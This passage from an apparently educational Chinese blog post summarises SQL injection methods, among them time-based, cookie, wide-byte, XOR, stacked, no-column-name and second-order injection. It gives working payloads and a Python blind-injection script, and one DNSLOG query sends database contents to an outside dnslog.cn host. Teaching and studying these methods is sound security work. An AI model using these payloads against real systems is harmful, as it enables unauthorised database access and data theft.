<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(length(database())=1,sleep(5),1)#</span><br><span class="line"></span><br><span class="line">1&#x27; and if(ascii(substr(database(),1,1))&gt;90,sleep(5),1)#</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>获取表名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#判断表个数</span><br><span class="line">1&#x27; and if((select count(table_name) from information_schema.tables where table_schema=database())=2,sleep(5),1)# </span><br><span class="line"></span><br><span class="line">#获取第一个表名长度</span><br><span class="line">1&#x27; and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=9,sleep(5),1) #</span><br><span class="line"></span><br><span class="line">#获取表名</span><br><span class="line">1&#x27; and (select ascii(substr(table_name, 1, 1)) from information_schema.tables where table_schema = &#x27;dvwa&#x27; limit 1) &gt;= 100 and sleep(5)#</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>获取列名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#列个数</span><br><span class="line">1&#x27; and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name= &#x27;guestbook&#x27;)=3,sleep(5),1) # </span><br><span class="line"></span><br><span class="line">#列长度</span><br><span class="line">1&#x27; and if(length((select column_name from information_schema.columns where table_name= &#x27;guestbook&#x27; limit 0,1))=10,sleep(5),1) #</span><br><span class="line"></span><br><span class="line">#列名</span><br><span class="line">1&#x27; and if((select ascii(substr(column_name, 2, 1)) from information_schema.columns where table_name = &#x27;guestbook&#x27; limit 0,1) &gt;= 100, sleep(5), 1) #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>获取字段</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if((select ascii(substr((select password from security.users limit 0,1),1,1))&gt;=100),sleep(5),1)#</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>原理：</p>
<p>ASP脚本中的request对象被用于从用户那里获取信息。</p>
<p><strong>而request对象的使用方法：request.[集合名称]（参数名称）效率低下，容易出错</strong></p>
<blockquote>
<p>获取从表单中提交的数据：request.form(“参数名称”)</p>
</blockquote>
<p><strong>但ASP中规定也可以省略集合名称：request(“参数名称”)，</strong>当使用这样的方式获取数据时，ASP规定按<code>QueryString、Form、Cookie、ServerVariables</code>的顺序来获取数据的。<strong>这样在request.cookies(“参数名称”)提交的数据没进行过滤时就可能存在Cookie注入</strong></p>
<p>条件：</p>
<ul>
<li>对get和post提交的数据进行了过滤，但<strong>未对cookie提交的数据库进行过滤</strong></li>
<li><strong>程序对提交数据获取方式是直接request(“xxx”)的方式，未指明使用request对象的具体方式进行获取</strong></li>
</ul>
<p>流程：</p>
<ul>
<li><p><strong>寻找参数位置</strong></p>
<p>如?id&#x3D;xx这样带参数</p>
</li>
<li><p><strong>去掉参数，观察参数影响</strong></p>
<p>将id&#x3D;xx删掉，看页面是否正常，正常则说明参数不起影响</p>
</li>
<li><p><strong>(先清空网址)输入”javascript:alert(document.cookie&#x3D;”id&#x3D;”+escape(“xx”));”</strong></p>
<p>弹出对话框后重新输入原来UR如果正常就说明<strong>以request(“id”)方式获取数据</strong></p>
<blockquote>
<p><strong>document.cookie</strong>:用于设置或获取当前cookie值，在这里是设置</p>
<p><strong>escape():对字符串进行编码</strong></p>
</blockquote>
</li>
<li><p><strong>判断是否存在漏洞</strong></p>
<p>带入SQL判断语句:</p>
<p><strong>javascript:alert(document.cookie&#x3D;”id&#x3D;”+escape(“xx and 1&#x3D;1”));</strong></p>
<p><strong>javascript:alert(document.cookie&#x3D;”id&#x3D;”+escape(“xx and 1&#x3D;2”));</strong></p>
<p><strong>若第一个正常，第二个不正常，则存在注入漏洞</strong></p>
</li>
<li><p><strong>cookie注入</strong></p>
<p>构造payload：</p>
<p><strong>javascript:alert(document.cookie&#x3D;”id&#x3D;”+escape(“xx order by 2”));</strong></p>
<p><strong>javascript:alert(document.cookie&#x3D;”id&#x3D;”+escape(“284 union select 1,database(),2”));</strong></p>
<blockquote>
<p><strong>可以burp抓包修改id值，就不用alert弹窗了，但要将值进行次url编码</strong></p>
<p><strong>当然除了联合注入也可以用其他注入方式</strong></p>
</blockquote>
</li>
</ul>
<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p><strong>字符、字符集</strong></p>
<p>字符是组成字符集的基本单位。对字符赋予一个数值来确定这个字符在该字符集中的位置</p>
<p><strong>UTF8</strong></p>
<p><strong>由于ASCII表示的字符只有128个，因此网络世界的规范是使用UNICODE编码，但是用ASCII表示的字符使用UNICODE并不高效。因此出现了中间格式字符集，被称为通用转换格式，即UTF(Universal Transformation Format)。</strong></p>
<p><strong>宽字节</strong></p>
<p><strong>如果一个字符的大小是一个字节的，称为窄字节；如果一个字符的大小是两个字节的，称为宽字节</strong></p>
<ul>
<li><strong>像GB2312、GBK、GB18030、BIG5、Shift_JIS等这些编码都是常说的宽字节，也就是只有两字节</strong></li>
<li><strong>英文默认占一个字节，中文占两个字节</strong></li>
</ul>
<p><strong>原理</strong></p>
<p>由于MySQL设置了转义函数，使<strong>输入的函数增添了<code>\</code>转义</strong>，而<strong>GBK占用两字节，ASCII占用一字节</strong></p>
<p>PHP中编码为UTF-8,函数执行添加的是ASCII编码（<code>\</code>),MySQL默认字符集是GBK等宽字符集</p>
<p><strong>由于<code>\</code>url转义编码是%5c，而<code>%df&#39;</code>转义后为<code>%df\&#39;</code>,即<code>%df%5c%27</code>,GBK宽字节编码会认为<code>%df%5c</code>是一个宽字节，即<code>運&#39;</code>,从而绕过</strong></p>
<p>流程：**<code>%df%27 浏览器url自动解码===&gt; β\&#39; 转为16进制===&gt; 0xdf0x5c0x27 转换为url编码===&gt; %df%5c%27 进行url解码(因为是GBK编码，%df和%5c结合为汉字)===&gt; 運&#39;</code>**</p>
<blockquote>
<p>常见转义函数即配置：<strong>addslashes、mysql_real_escape_string、mysql_escape_string、php.ini中magic_quote_gpc的配置</strong></p>
</blockquote>
<p><strong>条件</strong></p>
<ul>
<li><strong>首先要满足目标程序使用双&#x2F;多字节字符集进行解析</strong></li>
<li><strong>其次不同字符集范围不一样，可能低位不包含单字节字符集的字符，这样就没办法了，所以要保证在该种字符集范围中包含低字节位，比如 0x5C(01011100) 的字符，即转义符\。</strong></li>
</ul>
<p><strong>GET传参的宽字节注入</strong></p>
<p><strong>在引号前面加个<code>%df</code>即可,之后进行正常的注入</strong></p>
<p><strong>POST传参的宽字节注入</strong></p>
<p><strong>需要借助burp抓包改包</strong></p>
<ul>
<li><strong>正常写入注入语句 ，一般是在引号前写一个字符，并知道此字符对应的ascii码值，方便在包里找到输入数据 ，我比较喜欢用小写a &gt;&gt;&gt;a对应的ascii码值是61</strong></li>
<li><strong>burp抓包，找到引号前的字符即a，修改其<code>Hex</code>为<code>df</code>即可，后面流程一样</strong></li>
</ul>
<h3 id="异或注入"><a href="#异或注入" class="headerlink" title="异或注入"></a>异或注入</h3><p>原理：通过在构造where后面的判断条件时使用<strong>^（异或符号）或<code>xor</code><strong>来达到sql注入攻击的目的，运算法则是：</strong>两个条件相同（同真或同假）即为假<code>（0）</code>，两个条件不同即为真<code>（1）</code>，<code>null</code>与任何条件做异或运算都为<code>null</code></strong></p>
<p>因为异或逻辑通常返回的是1和0，所以一般用于<strong>盲注</strong>中。</p>
<p>应用场景是过滤了union select and or 等一些关键字。还能绕过空格过滤。</p>
<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#文字转ascii ord()</span></span><br><span class="line"><span class="comment">#ascii转文字 ascii()</span></span><br><span class="line"></span><br><span class="line">dic = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://test_url/?id=2&#x27;^&quot;</span></span><br><span class="line">keyword = <span class="string">&quot;keyword&quot;</span></span><br><span class="line">string = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">300</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        payload = <span class="string">&quot;!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(schema_name))FROM(information_schema.schemata)),&#123;0&#125;,1))=&#123;1&#125;))^&#x27;1&#x27;=&#x27;1&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i),<span class="built_in">ord</span>(j))</span><br><span class="line">        url_get = url + payload</span><br><span class="line">        <span class="built_in">print</span>(url_get)</span><br><span class="line">        content = requests.get(url_get)</span><br><span class="line">        <span class="keyword">if</span> keyword <span class="keyword">in</span> content.text:</span><br><span class="line">            string += j</span><br><span class="line">            <span class="built_in">print</span>(string)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;result = &quot;</span> + string)</span><br></pre></td></tr></table></figure>

<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>顾名思义，堆叠注入就是将语句堆叠在一起进行查询，因为<strong>mysql_multi_query()</strong> 支持<strong>多条sql语句同时执行</strong>，但需要<strong>以<code>;</code>分隔开</strong>。如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users;show databases; </span><br></pre></td></tr></table></figure>

<p>而 union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于<strong>union 或者union all 执行的语句类型是有限的，只可以用来执行查询语句，而堆叠注入可以执行的是任意的语句.</strong></p>
<h4 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h4><p>有注入点：即存在sql注入漏洞</p>
<p>未过滤：即<strong>未对”;”号进行过滤</strong></p>
<p>未禁用：即<strong>未禁止执行多条sql语句</strong></p>
<h4 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h4><p>利用mysqli_multi_query()函数就支持多条sql语句同时执行</p>
<p>但实际情况中，PHP为了<strong>防止sql注入机制</strong>，往往使用调用数据库的函数是<strong>mysqli_ query()函数</strong>，其<strong>只能执行一条语句</strong>，分号后面的内容将不会被执行</p>
<p>mysqli_query()函数:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysqli_query($connection, $query);</span><br><span class="line"> </span><br><span class="line">//$connection：表示与MySQL服务器的连接，可以通过mysqli_connect()函数进行创建。</span><br><span class="line">//$query：表示要执行的SQL查询语句。</span><br></pre></td></tr></table></figure>

<h3 id="DNSLOG外带注入"><a href="#DNSLOG外带注入" class="headerlink" title="DNSLOG外带注入"></a>DNSLOG外带注入</h3><p>目标站点没有回显，不知道是否利用成功时，就需要DNSLOG注入，即盲注</p>
<p>Windows中允许使用UNC路径访问网络 <code>\\计算机名或IP地址\共享名称\路径</code></p>
<p>利用前提：</p>
<ol>
<li><strong><code>secure_file_priv=</code>值为空</strong></li>
<li><strong>目标出网</strong></li>
<li><strong>有文件读取写入的权限，例如root</strong></li>
</ol>
<p>在数据库中执行以下命令，查看DNSLOG平台</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(&#x27;\\\\fekvlt.dnslog.cn\\aa&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/image-20241007143442024.png"></p>
<p>将要查询的内容带出来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(&#x27;\\\\&#x27;,(select database()),&#x27;.fekvlt.dnslog.cn\\a&#x27;));</span><br></pre></td></tr></table></figure>

<h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><p>在SQL绕过中也提及了在 <strong>mysql &#x3D;&gt; 5</strong> 的版本中存在库<strong>information_schema</strong>,记录着mysql中所有表的结构，通常，在mysql sqli中，我们会通过<strong>此库中的表去获取其他表的结构，即表名，列名等</strong>。但是这个库也会经常被WAF过滤。</p>
<p>而当<strong>information_schema</strong>库被过滤时我们需要用到**InnoDB 引擎表中的<code>mysql.innodb_table_stats</code>和<code>mysql.innodb_index_stats</code><strong>或</strong>sys库中<code>sys.schema_auto_increment_columns</code>和<code>schema_table_statistics_with_buffer和x$schema_table_statistics_with_buffer</code>**来获取库名和表名，用法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,2,(select group_concat(database_name) from mysql.innodb_table_stats)%23</span><br><span class="line"></span><br><span class="line">?id=0&#x27; union select 1,2,(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())%23</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 查询数据库</span><br><span class="line">select table_schema from sys.schema_auto_increment_columns;</span><br><span class="line"># 查询指定数据库的表</span><br><span class="line">select table_name from sys.schema_auto_increment_columns where table_schema=&#x27;security&#x27;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>**<code>sys.schema_auto_increment_columns</code>**用于那些有自增字段表的数据库的信息</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 查询数据库</span><br><span class="line">select table_schema from sys.schema_table_statistics_with_buffer;</span><br><span class="line">select table_schema from sys.x$schema_table_statistics_with_buffer;</span><br><span class="line"># 查询指定数据库的表</span><br><span class="line">select table_name from sys.schema_table_statistics_with_buffer where table_schema=&#x27;challenges&#x27;;</span><br><span class="line">select table_name from sys.x$schema_table_statistics_with_buffer where table_schema=&#x27;challenges&#x27;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>**<code>sys.schema_table_statistics_with_buffer</code>和<code>sys.x$schema_table_statistics_with_buffer</code>**用于那些没有自增字段表的数据库的信息</p>
</blockquote>
<p>但上面几种查询方法都有一个致命的缺点就是只能查到库名和表名，不能得到完整的字段名，这时就需要无列名注入。</p>
<ul>
<li><h4 id="union联合-子查询"><a href="#union联合-子查询" class="headerlink" title="union联合+子查询"></a><strong>union联合+子查询</strong></h4><p>正常情况下的SQL查询：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ20250110-192953.png"></p>
<p>可以看到列名为a,b,使用union联合查询：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2 union select * from test;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ20250110-193151.png"></p>
<p>可以看到我们的列名被替换成了对应的数字，也就是说我们可以继续数字来对应列，如对应b:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select `2` from (select 1,2 union select * from test)a;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>其中**<code>2</code>用反引号是为了标识列名，如果不标识则2只是一个数字字面量而不是列名会报错，也可以<code>a.2</code>标识列<strong>，而</strong>a是对子查询的一个命名，可以为任意字符但不能没有**</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ20250110-193623.png"></p>
<p>而多数情况&#96;会被过滤。当 &#96;&#96;不能使用的时候，可使用<strong>别名</strong>来代替：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select b from (select 1,2 as b union select * from test)a;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ20250110-194128.png"></p>
<p>同样我们可以查多个列：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select concat(`1`,0x2d,`2`) from(select 1,2 union select * from test)</span><br><span class="line">a;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ20250110-194236.png"></p>
<p>所以我们可通过该方法查到任意想要的字段值，payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select a,b from posts where a=-1 union select 1,(select concat(`3`,0x2d,`4`) from (select 1,2,3,4,5,6 union select * from xxx)a limit 1,1);</span><br></pre></td></tr></table></figure>
</li>
<li><h4 id="join、using"><a href="#join、using" class="headerlink" title="join、using"></a>join、using</h4><p>join用于合并两个表，using表示使用什么字段进行连接，用using指定了连接字段则查询结果只返回连接字段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select * from test a join test b)c;</span><br></pre></td></tr></table></figure>

<p>原理是用 join 连接两张表时, <strong>遇到重复的列名会报错, 并把这个报错的列名显示出来</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from (select * from test a join test b)c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;a&#x27;</span><br><span class="line">mysql&gt; select * from (select * from test a join test b using(a))c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;b&#x27;</span><br></pre></td></tr></table></figure>

<p>通过 using 可以<strong>声明连接时的关联条件</strong>, 类似于平常写 inner join 时候的 <strong><code>on a.id = b.id</code></strong>, 这样就可以<strong>避免该字段重复而报错</strong></p>
<p>这里设置别名的时候省略了 <code>as</code>, 完整的写法如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select * from users as a join users as b) as c</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ20250110-203658.png"></p>
<p>而join在连接不同表时不需要用别名，因为两张表本身就不一样，但是我们把test自身连接就需要设置别名以对两张表进行区分，否则会报错</p>
<p>这里有三种利用，union第一种：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from emails where id=1 union select * from (select * from users a join users b)c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;id&#x27;</span><br><span class="line">mysql&gt; select * from emails where id=1 union select * from (select * from users a join users b using(id))c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;username&#x27;</span><br></pre></td></tr></table></figure>

<p>union第二种，需要知道字段数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from emails where id=1 union select 1,(select * from (select * from users a join users b)c);</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;id&#x27;</span><br><span class="line">mysql&gt; select * from emails where id=1 union select 1,(select * from (select * from users a join users b using(id))c);</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;username&#x27;</span><br></pre></td></tr></table></figure>

<p>直接用 and 连接, 不使用 union</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from emails where id=1 and (select * from (select * from users a join users b)c);</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;id&#x27;</span><br><span class="line">mysql&gt; select * from emails where id=1 and (select * from (select * from users a join users b using(id))c);</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;username&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><h4 id="order-by盲注"><a href="#order-by盲注" class="headerlink" title="order by盲注"></a>order by盲注</h4><p>order by对结果进行排序：0-9 a-z，不区分大小写</p>
<p>本质上是利用 order by 按字母顺序排序的特点, 如果我们<strong>输入的数据前几位符合 password 的内容, 会优先显示我们的数据</strong>, 如果输入的数据不符合的话, 就会显示原本的数据 (也可以加上 asc desc 改一下显示顺序)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from test where a=&#x27;111&#x27; union select 1,&#x27;111111&#x27; order by 2;</span><br><span class="line"></span><br><span class="line">select * from test where a=&#x27;111&#x27; union select 1,&#x27;1111112&#x27; order by 2;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ20250110-203316.png"></p>
</li>
<li><h4 id="ascii比较盲注"><a href="#ascii比较盲注" class="headerlink" title="ascii比较盲注"></a>ascii比较盲注</h4><p>利用 mysql 比较字符时会转换成 ascii 的特性来进行盲注</p>
<p>原理就是利用字符串单个字符依次比较：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ20250110-205013.png"></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from test where a=&#x27;111&#x27; and (select &#x27;111&#x27;,&#x27;1&#x27;)&gt;(select * from test limit 0,1);</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test where a=&#x27;111&#x27; and (select &#x27;111&#x27;,&#x27;111&#x27;)&gt;(select * from test limit 0,1);</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test where a=&#x27;111&#x27; and (select &#x27;111&#x27;,&#x27;111111&#x27;)&gt;(select * from test limit 0,1);</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test where a=&#x27;111&#x27; and (select &#x27;111&#x27;,&#x27;1111111&#x27;)&gt;(select * from test limit 0,1);</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test where a=&#x27;111&#x27; and (select &#x27;111&#x27;,&#x27;11111111&#x27;)&gt;(select * from test limit 0,1);</span><br><span class="line">+-----+---------+</span><br><span class="line">| a   | b       |</span><br><span class="line">+-----+---------+</span><br><span class="line">| 111 | 1111111 |</span><br><span class="line">+-----+---------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ20250110-205612.png"></p>
<p>也可以比较字符串，但该方法有个缺点，就是列名是<code>id username password</code>，如果想猜出password的内容，就要把id和username猜出来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(select 1,2,3)&gt;(select * from users limit 0,1); # 第一个位置先猜 id</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">(select 1,&#x27;Dumb&#x27;,3)&gt;(select * from users limit 0,1); # 第二个位置再猜 username</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">(select 1,&#x27;Dumb&#x27;,&#x27;Dumb&#x27;)&gt;(select * from users limit 0,1); # 第三个位置才能猜 password</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>利用条件：知道数据库中的列名且后端使用了<code>magic_quotes_gpc</code>等转移函数对引号过滤</p>
<p>原理就是在我们进行SQL注入时，后端仅仅使用了addslashes()或者magic_quotes_gpc()等转义函数对字符进行了转义，但存入数据库时存入的数据依然是原来的数据，且数据库对存入数据十分信任，下次取出时毫无保留的取出从而引发安全问题。</p>
<p>比如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br></pre></td></tr></table></figure>

<p>这时我们传入数据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&#x27;#</span><br></pre></td></tr></table></figure>

<p>虽然会被转义，但传入数据库后数据就为<code>admin&#39;#</code>，当下次我们登录时<code>admin&#39;#</code>就会直接取出：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;SELECT * FROM users WHERE username=&#x27;admin&#x27;#&#x27; and password=&#x27;$password&#x27;&quot;;</span><br></pre></td></tr></table></figure>

<p>从而实现二次注入</p>
